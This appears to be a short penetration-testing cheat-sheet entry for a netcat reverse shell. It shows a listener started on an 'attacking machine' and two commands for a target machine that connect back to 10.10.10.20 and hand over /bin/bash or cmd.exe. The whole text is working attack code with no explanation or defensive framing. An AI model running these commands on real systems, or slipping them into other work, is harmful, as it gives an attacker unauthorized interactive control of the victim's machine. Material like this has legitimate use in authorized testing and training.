# setup a listener on the attacking machine
sudo nc -lvnp 80

# connect back to the listener from the target machine
nc 10.10.10.20 80 -e /bin/bash
nc 10.10.10.20 80 -e "cmd.exe"